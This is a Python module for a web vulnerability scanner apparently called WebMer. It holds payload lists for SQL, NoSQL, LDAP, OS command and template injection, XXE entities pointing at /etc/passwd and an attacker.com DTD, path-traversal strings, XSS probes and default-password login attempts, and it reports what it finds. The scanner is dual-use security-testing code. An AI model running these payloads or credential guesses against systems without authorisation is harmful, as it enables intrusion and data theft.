#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Vulnerability Scanner Module for WebMer
Comprehensive Vulnerability Detection and Exploitation Framework
"""

import asyncio
import aiohttp
import json
import re
import subprocess
import time
import random
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style
import xml.etree.ElementTree as ET

class VulnerabilityScanner:
    def __init__(self, target_url, session=None):
        self.target_url = target_url
        self.session = session
        self.vulnerabilities = []
        
    async def comprehensive_scan(self):
        """Perform comprehensive vulnerability scan"""
        print(f"{Fore.CYAN}[*] Starting comprehensive vulnerability scan")
        print(f"{Fore.YELLOW}[*] Target: {self.target_url}")
        
        # Different vulnerability categories
        await self._scan_injection_vulnerabilities()
        await self._scan_authentication_vulnerabilities()
        await self._scan_configuration_vulnerabilities()
        await self._scan_information_disclosure()
        await self._scan_business_logic_flaws()
        await self._scan_client_side_vulnerabilities()
        
        self._print_vulnerability_summary()
        return self.vulnerabilities
    
    async def _scan_injection_vulnerabilities(self):
        """Scan for injection vulnerabilities"""
        print(f"{Fore.BLUE}[*] Scanning for injection vulnerabilities...")
        
        # SQL Injection
        await self._test_sql_injection()
        
        # NoSQL Injection
        await self._test_nosql_injection()
        
        # LDAP Injection
        await self._test_ldap_injection()
        
        # OS Command Injection
        await self._test_command_injection()
        
        # Code Injection
        await self._test_code_injection()
        
        # XXE Injection
        await self._test_xxe_injection()
    
    async def _test_sql_injection(self):
        """Test for SQL injection vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing SQL injection...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "') OR ('1'='1",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1",
            "1' AND (SELECT SUBSTRING(@@version,1,1))='5' AND '1'='1",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND '1'='1",
            "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
            "1' UNION SELECT user(),database(),version()--"
        ]
        
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"Driver.*SQL.*Driver",
            r"SQLServer JDBC Driver",
            r"SqlException",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\Woci_.*",
            r"Warning.*\Wora_.*"
        ]
        
        for payload in sql_payloads:
            try:
                # Test in URL parameters
                test_url = f"{self.target_url}?id={payload}"
                async with self.session.get(test_url, timeout=10) as response:
                    response_text = await response.text()
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            vulnerability = {
                                'type': 'SQL Injection',
                                'severity': 'High',
                                'location': test_url,
                                'payload': payload,
                                'evidence': f"Error pattern matched: {pattern}",
                                'description': 'SQL injection vulnerability detected through error-based detection'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] SQL Injection found: {test_url}")
                            break
                            
            except Exception as e:
                continue
    
    async def _test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing NoSQL injection...")
        
        nosql_payloads = [
            "true, $where: '1 == 1'",
            ", $where: '1 == 1'",
            "$where: '1 == 1'",
            "', $where: '1 == 1', $comment: '",
            "\\'; return true; var foo = '",
            "1'; return true; var foo = '1",
            "'; return true; //",
            "\\'; return true; //",
            "1'; return true; //",
            "{$gt: ''}",
            "[$ne]=1",
            "[$regex]=.*",
            "[$where]=1"
        ]
        
        for payload in nosql_payloads:
            try:
                test_url = f"{self.target_url}?search={payload}"
                async with self.session.get(test_url, timeout=10) as response:
                    response_text = await response.text()
                    
                    # Check for NoSQL error messages
                    nosql_errors = [
                        "MongoError", "MongoException", "CouchDB", "ReferenceError",
                        "SyntaxError", "TypeError", "mongo", "couch"
                    ]
                    
                    for error in nosql_errors:
                        if error.lower() in response_text.lower():
                            vulnerability = {
                                'type': 'NoSQL Injection',
                                'severity': 'High',
                                'location': test_url,
                                'payload': payload,
                                'evidence': f"NoSQL error detected: {error}",
                                'description': 'NoSQL injection vulnerability detected'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] NoSQL Injection found: {test_url}")
                            break
                            
            except Exception:
                continue
    
    async def _test_ldap_injection(self):
        """Test for LDAP injection vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing LDAP injection...")
        
        ldap_payloads = [
            "*)(uid=*))(|(uid=*",
            "*)(|(password=*))",
            "*()|%26'",
            "admin)(&(password=*))",
            "admin)(!(&(1=0)))",
            ")(cn=*)"
        ]
        
        for payload in ldap_payloads:
            try:
                test_url = f"{self.target_url}?username={payload}"
                async with self.session.get(test_url, timeout=10) as response:
                    response_text = await response.text()
                    
                    # Check for LDAP errors
                    if any(error in response_text.lower() for error in ['ldap', 'directory', 'distinguished name']):
                        vulnerability = {
                            'type': 'LDAP Injection',
                            'severity': 'Medium',
                            'location': test_url,
                            'payload': payload,
                            'evidence': 'LDAP error messages detected',
                            'description': 'LDAP injection vulnerability detected'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.RED}[!] LDAP Injection found: {test_url}")
                        break
                        
            except Exception:
                continue
    
    async def _test_command_injection(self):
        """Test for OS command injection"""
        print(f"{Fore.YELLOW}[*] Testing command injection...")
        
        cmd_payloads = [
            "; ls -la",
            "| ls -la",
            "& dir",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ping -c 4 127.0.0.1",
            "| ping -c 4 127.0.0.1",
            "; sleep 5",
            "| sleep 5",
            "`ls -la`",
            "$(ls -la)",
            ";id",
            "|id",
            "&id"
        ]
        
        for payload in cmd_payloads:
            try:
                test_url = f"{self.target_url}?cmd={payload}"
                start_time = time.time()
                
                async with self.session.get(test_url, timeout=15) as response:
                    response_text = await response.text()
                    response_time = time.time() - start_time
                    
                    # Check for command execution evidence
                    cmd_indicators = [
                        'root:', 'daemon:', 'bin:', 'sys:', 'total', 'drwx',
                        'uid=', 'gid=', 'groups=', 'PING', 'packets transmitted'
                    ]
                    
                    for indicator in cmd_indicators:
                        if indicator in response_text:
                            vulnerability = {
                                'type': 'Command Injection',
                                'severity': 'Critical',
                                'location': test_url,
                                'payload': payload,
                                'evidence': f"Command execution evidence: {indicator}",
                                'description': 'OS command injection vulnerability detected'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] Command Injection found: {test_url}")
                            return
                    
                    # Check for time-based detection
                    if 'sleep' in payload and response_time > 4:
                        vulnerability = {
                            'type': 'Command Injection (Time-based)',
                            'severity': 'Critical',
                            'location': test_url,
                            'payload': payload,
                            'evidence': f"Response time: {response_time:.2f}s",
                            'description': 'Time-based command injection detected'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.RED}[!] Time-based Command Injection found: {test_url}")
                        
            except Exception:
                continue
    
    async def _test_code_injection(self):
        """Test for code injection vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing code injection...")
        
        code_payloads = [
            "<?php echo 'vulnerable'; ?>",
            "<%=7*7%>",
            "${7*7}",
            "{{7*7}}",
            "<%= 7*7 %>",
            "#{7*7}",
            "${{''.class.mro()[2].subclasses()[40]('/etc/passwd').read()}}",
            "{{config.items()}}",
            "${@print(md5('vulnerable'))}",
            "eval('7*7')"
        ]
        
        for payload in code_payloads:
            try:
                test_url = f"{self.target_url}?code={payload}"
                async with self.session.get(test_url, timeout=10) as response:
                    response_text = await response.text()
                    
                    # Check for code execution
                    if '49' in response_text or 'vulnerable' in response_text:
                        vulnerability = {
                            'type': 'Code Injection',
                            'severity': 'Critical',
                            'location': test_url,
                            'payload': payload,
                            'evidence': 'Code execution detected',
                            'description': 'Server-side code injection vulnerability'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.RED}[!] Code Injection found: {test_url}")
                        
            except Exception:
                continue
    
    async def _test_xxe_injection(self):
        """Test for XXE injection vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing XXE injection...")
        
        xxe_payloads = [
            '''<?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
            <root>&test;</root>''',
            
            '''<?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY test SYSTEM 'http://example.com/evil.dtd'>]>
            <root>&test;</root>''',
            
            '''<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
            <foo>&xxe;</foo>''',
            
            '''<?xml version="1.0"?>
            <!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]>
            <root/>'''
        ]
        
        for payload in xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                async with self.session.post(self.target_url, data=payload, headers=headers, timeout=10) as response:
                    response_text = await response.text()
                    
                    # Check for file content disclosure
                    if 'root:' in response_text or 'daemon:' in response_text:
                        vulnerability = {
                            'type': 'XXE Injection',
                            'severity': 'High',
                            'location': self.target_url,
                            'payload': payload[:100] + "...",
                            'evidence': 'File content disclosure detected',
                            'description': 'XML External Entity injection vulnerability'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.RED}[!] XXE Injection found: {self.target_url}")
                        
            except Exception:
                continue
    
    async def _scan_authentication_vulnerabilities(self):
        """Scan for authentication vulnerabilities"""
        print(f"{Fore.BLUE}[*] Scanning authentication vulnerabilities...")
        
        await self._test_weak_passwords()
        await self._test_session_vulnerabilities()
        await self._test_jwt_vulnerabilities()
    
    async def _test_weak_passwords(self):
        """Test for weak password policies"""
        print(f"{Fore.YELLOW}[*] Testing weak passwords...")
        
        common_passwords = [
            "admin", "password", "123456", "admin123", "root", "test",
            "password123", "admin@123", "qwerty", "letmein"
        ]
        
        login_endpoints = [
            "/login", "/admin", "/signin", "/auth", "/authenticate"
        ]
        
        for endpoint in login_endpoints:
            try:
                login_url = urljoin(self.target_url, endpoint)
                
                # First, check if endpoint exists
                async with self.session.get(login_url, timeout=10) as response:
                    if response.status == 200:
                        for password in common_passwords[:3]:  # Limit attempts
                            login_data = {
                                'username': 'admin',
                                'password': password,
                                'user': 'admin',
                                'pass': password
                            }
                            
                            async with self.session.post(login_url, data=login_data, timeout=10) as auth_response:
                                if auth_response.status == 200:
                                    response_text = await auth_response.text()
                                    
                                    # Check for successful login indicators
                                    success_indicators = ['dashboard', 'welcome', 'logout', 'profile']
                                    
                                    if any(indicator in response_text.lower() for indicator in success_indicators):
                                        vulnerability = {
                                            'type': 'Weak Authentication',
                                            'severity': 'High',
                                            'location': login_url,
                                            'payload': f"admin:{password}",
                                            'evidence': 'Successful login with weak credentials',
                                            'description': 'Weak password allows unauthorized access'
                                        }
                                        self.vulnerabilities.append(vulnerability)
                                        print(f"{Fore.RED}[!] Weak password found: {login_url}")
                                        return
                                        
            except Exception:
                continue
    
    async def _test_session_vulnerabilities(self):
        """Test for session management vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing session vulnerabilities...")
        
        try:
            async with self.session.get(self.target_url, timeout=10) as response:
                cookies = response.cookies
                headers = response.headers
                
                # Check for insecure session cookies
                for cookie in cookies:
                    if 'session' in cookie.key.lower() or 'auth' in cookie.key.lower():
                        issues = []
                        
                        if not cookie.get('secure'):
                            issues.append("Missing Secure flag")
                        
                        if not cookie.get('httponly'):
                            issues.append("Missing HttpOnly flag")
                        
                        if not cookie.get('samesite'):
                            issues.append("Missing SameSite attribute")
                        
                        if issues:
                            vulnerability = {
                                'type': 'Insecure Session Management',
                                'severity': 'Medium',
                                'location': self.target_url,
                                'payload': f"Cookie: {cookie.key}",
                                'evidence': f"Security issues: {', '.join(issues)}",
                                'description': 'Session cookie lacks security attributes'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] Insecure session cookie: {cookie.key}")
                            
        except Exception:
            pass
    
    async def _test_jwt_vulnerabilities(self):
        """Test for JWT vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing JWT vulnerabilities...")
        
        # Common JWT patterns in responses
        jwt_patterns = [
            r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            r'"token":\s*"eyJ[^"]*"',
            r'"jwt":\s*"eyJ[^"]*"'
        ]
        
        try:
            async with self.session.get(self.target_url, timeout=10) as response:
                response_text = await response.text()
                
                for pattern in jwt_patterns:
                    matches = re.findall(pattern, response_text)
                    
                    for jwt_token in matches:
                        # Basic JWT structure validation
                        if jwt_token.count('.') == 2:
                            vulnerability = {
                                'type': 'JWT Token Exposure',
                                'severity': 'Medium',
                                'location': self.target_url,
                                'payload': jwt_token[:50] + "...",
                                'evidence': 'JWT token found in response',
                                'description': 'JWT token exposed in client-side response'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] JWT token exposed: {self.target_url}")
                            
        except Exception:
            pass
    
    async def _scan_configuration_vulnerabilities(self):
        """Scan for configuration vulnerabilities"""
        print(f"{Fore.BLUE}[*] Scanning configuration vulnerabilities...")
        
        await self._test_directory_listing()
        await self._test_backup_files()
        await self._test_sensitive_files()
        await self._test_security_headers()
    
    async def _test_directory_listing(self):
        """Test for directory listing vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing directory listing...")
        
        directories = [
            "/", "/admin", "/backup", "/config", "/images", "/css", "/js",
            "/uploads", "/files", "/documents", "/temp", "/logs"
        ]
        
        for directory in directories:
            try:
                test_url = urljoin(self.target_url, directory)
                async with self.session.get(test_url, timeout=10) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check for directory listing indicators
                        listing_indicators = [
                            'Index of', 'Directory Listing', 'Parent Directory',
                            '<title>Index of', 'folder.gif', 'dir.gif'
                        ]
                        
                        if any(indicator in response_text for indicator in listing_indicators):
                            vulnerability = {
                                'type': 'Directory Listing',
                                'severity': 'Low',
                                'location': test_url,
                                'payload': directory,
                                'evidence': 'Directory listing enabled',
                                'description': 'Directory listing allows information disclosure'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] Directory listing found: {test_url}")
                            
            except Exception:
                continue
    
    async def _test_backup_files(self):
        """Test for backup files"""
        print(f"{Fore.YELLOW}[*] Testing for backup files...")
        
        backup_extensions = [
            ".bak", ".backup", ".old", ".orig", ".save", ".tmp",
            ".swp", ".swo", "~", ".tar", ".zip", ".tar.gz"
        ]
        
        common_files = [
            "index", "config", "database", "admin", "login", "main"
        ]
        
        for file_base in common_files:
            for ext in backup_extensions:
                try:
                    backup_file = f"{file_base}{ext}"
                    test_url = urljoin(self.target_url, backup_file)
                    
                    async with self.session.get(test_url, timeout=10) as response:
                        if response.status == 200:
                            vulnerability = {
                                'type': 'Backup File Exposure',
                                'severity': 'Medium',
                                'location': test_url,
                                'payload': backup_file,
                                'evidence': 'Backup file accessible',
                                'description': 'Backup files may contain sensitive information'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] Backup file found: {test_url}")
                            
                except Exception:
                    continue
    
    async def _test_sensitive_files(self):
        """Test for sensitive file exposure"""
        print(f"{Fore.YELLOW}[*] Testing for sensitive files...")
        
        sensitive_files = [
            "/.env", "/.git/config", "/web.config", "/config.php",
            "/phpinfo.php", "/info.php", "/test.php", "/admin.php",
            "/robots.txt", "/sitemap.xml", "/.htaccess", "/crossdomain.xml",
            "/clientaccesspolicy.xml", "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF"
        ]
        
        for file_path in sensitive_files:
            try:
                test_url = urljoin(self.target_url, file_path)
                async with self.session.get(test_url, timeout=10) as response:
                    if response.status == 200:
                        response_text = await response.text()
                        
                        # Check for sensitive content
                        sensitive_patterns = [
                            'password', 'secret', 'key', 'token', 'api_key',
                            'database', 'mysql', 'postgres', 'mongodb'
                        ]
                        
                        if any(pattern in response_text.lower() for pattern in sensitive_patterns):
                            vulnerability = {
                                'type': 'Sensitive File Exposure',
                                'severity': 'High',
                                'location': test_url,
                                'payload': file_path,
                                'evidence': 'Sensitive information found in file',
                                'description': 'Sensitive configuration file exposed'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] Sensitive file found: {test_url}")
                            
            except Exception:
                continue
    
    async def _test_security_headers(self):
        """Test for missing security headers"""
        print(f"{Fore.YELLOW}[*] Testing security headers...")
        
        try:
            async with self.session.get(self.target_url, timeout=10) as response:
                headers = response.headers
                
                # Required security headers
                security_headers = {
                    'X-Frame-Options': 'Clickjacking protection',
                    'X-Content-Type-Options': 'MIME sniffing protection',
                    'X-XSS-Protection': 'XSS protection',
                    'Strict-Transport-Security': 'HTTPS enforcement',
                    'Content-Security-Policy': 'Content injection protection',
                    'Referrer-Policy': 'Referrer information control'
                }
                
                missing_headers = []
                for header, description in security_headers.items():
                    if header not in headers:
                        missing_headers.append(f"{header} ({description})")
                
                if missing_headers:
                    vulnerability = {
                        'type': 'Missing Security Headers',
                        'severity': 'Medium',
                        'location': self.target_url,
                        'payload': ', '.join(missing_headers),
                        'evidence': f"Missing {len(missing_headers)} security headers",
                        'description': 'Important security headers are missing'
                    }
                    self.vulnerabilities.append(vulnerability)
                    print(f"{Fore.RED}[!] Missing security headers: {len(missing_headers)}")
                    
        except Exception:
            pass
    
    async def _scan_information_disclosure(self):
        """Scan for information disclosure vulnerabilities"""
        print(f"{Fore.BLUE}[*] Scanning information disclosure...")
        
        await self._test_error_disclosure()
        await self._test_version_disclosure()
        await self._test_path_disclosure()
    
    async def _test_error_disclosure(self):
        """Test for error message disclosure"""
        print(f"{Fore.YELLOW}[*] Testing error disclosure...")
        
        error_triggers = [
            "'", "\"", "<", ">", ")", "(", "[", "]", "{", "}",
            "../", "..\\", "%00", "%0a", "%0d", "%20", "%3c", "%3e"
        ]
        
        for trigger in error_triggers:
            try:
                test_url = f"{self.target_url}?param={trigger}"
                async with self.session.get(test_url, timeout=10) as response:
                    response_text = await response.text()
                    
                    # Check for error messages
                    error_patterns = [
                        r'Warning:', r'Error:', r'Exception:', r'Fatal error:',
                        r'Parse error:', r'Notice:', r'Stack trace:',
                        r'File ".*", line \d+', r'Traceback \(most recent call last\)'
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            vulnerability = {
                                'type': 'Error Message Disclosure',
                                'severity': 'Low',
                                'location': test_url,
                                'payload': trigger,
                                'evidence': f"Error pattern: {pattern}",
                                'description': 'Application error messages disclosed'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] Error disclosure found: {test_url}")
                            break
                            
            except Exception:
                continue
    
    async def _test_version_disclosure(self):
        """Test for version information disclosure"""
        print(f"{Fore.YELLOW}[*] Testing version disclosure...")
        
        try:
            async with self.session.get(self.target_url, timeout=10) as response:
                headers = response.headers
                response_text = await response.text()
                
                # Check headers for version info
                version_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-Generator']
                
                for header in version_headers:
                    if header in headers:
                        vulnerability = {
                            'type': 'Version Information Disclosure',
                            'severity': 'Low',
                            'location': self.target_url,
                            'payload': f"{header}: {headers[header]}",
                            'evidence': 'Version information in headers',
                            'description': 'Server/framework version disclosed'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.RED}[!] Version disclosure: {header}")
                
                # Check content for version info
                version_patterns = [
                    r'jQuery v?\d+\.\d+\.\d+',
                    r'Angular v?\d+\.\d+\.\d+',
                    r'React v?\d+\.\d+\.\d+',
                    r'WordPress \d+\.\d+\.\d+'
                ]
                
                for pattern in version_patterns:
                    matches = re.findall(pattern, response_text, re.IGNORECASE)
                    for match in matches:
                        vulnerability = {
                            'type': 'Framework Version Disclosure',
                            'severity': 'Low',
                            'location': self.target_url,
                            'payload': match,
                            'evidence': 'Framework version in content',
                            'description': 'Client-side framework version disclosed'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.RED}[!] Framework version found: {match}")
                        
        except Exception:
            pass
    
    async def _test_path_disclosure(self):
        """Test for path disclosure vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing path disclosure...")
        
        path_triggers = [
            "../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "/etc/passwd%00",
            "php://filter/read=convert.base64-encode/resource=/etc/passwd"
        ]
        
        for trigger in path_triggers:
            try:
                test_url = f"{self.target_url}?file={trigger}"
                async with self.session.get(test_url, timeout=10) as response:
                    response_text = await response.text()
                    
                    # Check for path disclosure
                    path_patterns = [
                        r'[A-Z]:\\[^<]*',  # Windows paths
                        r'/[a-zA-Z0-9_/-]+\.[a-zA-Z]{2,4}',  # Unix paths
                        r'root:x:0:0:',  # /etc/passwd content
                        r'# localhost name resolution'  # hosts file content
                    ]
                    
                    for pattern in path_patterns:
                        if re.search(pattern, response_text):
                            vulnerability = {
                                'type': 'Path Disclosure',
                                'severity': 'Medium',
                                'location': test_url,
                                'payload': trigger,
                                'evidence': f"Path pattern: {pattern}",
                                'description': 'File system path information disclosed'
                            }
                            self.vulnerabilities.append(vulnerability)
                            print(f"{Fore.RED}[!] Path disclosure found: {test_url}")
                            break
                            
            except Exception:
                continue
    
    async def _scan_business_logic_flaws(self):
        """Scan for business logic vulnerabilities"""
        print(f"{Fore.BLUE}[*] Scanning business logic flaws...")
        

        await self._test_race_conditions()
    
    async def _test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing race conditions...")
        
        # Simple race condition test - multiple rapid requests
        try:
            tasks = []
            for i in range(10):
                task = asyncio.create_task(
                    self.session.get(f"{self.target_url}?action=transfer&amount=100", timeout=5)
                )
                tasks.append(task)
            
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Analyze responses for inconsistencies
            status_codes = [r.status for r in responses if hasattr(r, 'status')]
            
            if len(set(status_codes)) > 1:
                vulnerability = {
                    'type': 'Potential Race Condition',
                    'severity': 'Medium',
                    'location': self.target_url,
                    'payload': 'Concurrent requests',
                    'evidence': f"Inconsistent responses: {status_codes}",
                    'description': 'Race condition may exist in concurrent operations'
                }
                self.vulnerabilities.append(vulnerability)
                print(f"{Fore.RED}[!] Potential race condition: {self.target_url}")
                
        except Exception:
            pass
    
    async def _scan_client_side_vulnerabilities(self):
        """Scan for client-side vulnerabilities"""
        print(f"{Fore.BLUE}[*] Scanning client-side vulnerabilities...")
        
        await self._test_dom_xss()
        await self._test_client_side_injection()
    
    async def _test_dom_xss(self):
        """Test for DOM-based XSS"""
        print(f"{Fore.YELLOW}[*] Testing DOM XSS...")
        
        dom_xss_payloads = [
            "#<script>alert('DOM_XSS')</script>",
            "#<img src=x onerror=alert('DOM_XSS')>",
            "#javascript:alert('DOM_XSS')",
            "#<svg onload=alert('DOM_XSS')>"
        ]
        
        for payload in dom_xss_payloads:
            try:
                test_url = f"{self.target_url}{payload}"
                async with self.session.get(test_url, timeout=10) as response:
                    response_text = await response.text()
                    
                    # Check if payload is reflected in JavaScript
                    if payload[1:] in response_text and 'script' in response_text.lower():
                        vulnerability = {
                            'type': 'DOM-based XSS',
                            'severity': 'High',
                            'location': test_url,
                            'payload': payload,
                            'evidence': 'Payload reflected in DOM',
                            'description': 'DOM-based cross-site scripting vulnerability'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.RED}[!] DOM XSS found: {test_url}")
                        
            except Exception:
                continue
    
    async def _test_client_side_injection(self):
        """Test for client-side injection vulnerabilities"""
        print(f"{Fore.YELLOW}[*] Testing client-side injection...")
        
        try:
            async with self.session.get(self.target_url, timeout=10) as response:
                response_text = await response.text()
                
                # Check for dangerous JavaScript patterns
                dangerous_patterns = [
                    r'eval\s*\(',
                    r'document\.write\s*\(',
                    r'innerHTML\s*=',
                    r'outerHTML\s*=',
                    r'\.html\s*\(',
                    r'location\.href\s*=',
                    r'window\.open\s*\('
                ]
                
                for pattern in dangerous_patterns:
                    matches = re.findall(pattern, response_text, re.IGNORECASE)
                    if matches:
                        vulnerability = {
                            'type': 'Potentially Dangerous JavaScript',
                            'severity': 'Low',
                            'location': self.target_url,
                            'payload': pattern,
                            'evidence': f"Found {len(matches)} instances",
                            'description': 'Potentially dangerous JavaScript patterns detected'
                        }
                        self.vulnerabilities.append(vulnerability)
                        print(f"{Fore.YELLOW}[!] Dangerous JS pattern: {pattern}")
                        
        except Exception:
            pass
    
    def _print_vulnerability_summary(self):
        """Print vulnerability scan summary"""
        print(f"\n{Fore.GREEN}{'='*70}")
        print(f"{Fore.YELLOW}  VULNERABILITY SCAN SUMMARY")
        print(f"{Fore.GREEN}{'='*70}")
        print(f"{Fore.CYAN}  Target: {self.target_url}")
        print(f"{Fore.CYAN}  Total Vulnerabilities: {len(self.vulnerabilities)}")
        
        # Count by severity
        severity_count = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        for vuln in self.vulnerabilities:
            severity_count[vuln['severity']] += 1
        
        print(f"\n{Fore.RED}  Critical: {severity_count['Critical']}")
        print(f"{Fore.RED}  High: {severity_count['High']}")
        print(f"{Fore.YELLOW}  Medium: {severity_count['Medium']}")
        print(f"{Fore.GREEN}  Low: {severity_count['Low']}")
        
        # List vulnerabilities by type
        vuln_types = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type not in vuln_types:
                vuln_types[vuln_type] = 0
            vuln_types[vuln_type] += 1
        
        print(f"\n{Fore.CYAN}  Vulnerability Types:")
        for vuln_type, count in vuln_types.items():
            print(f"    {vuln_type}: {count}")
        
        print(f"{Fore.GREEN}{'='*70}{Style.RESET_ALL}")
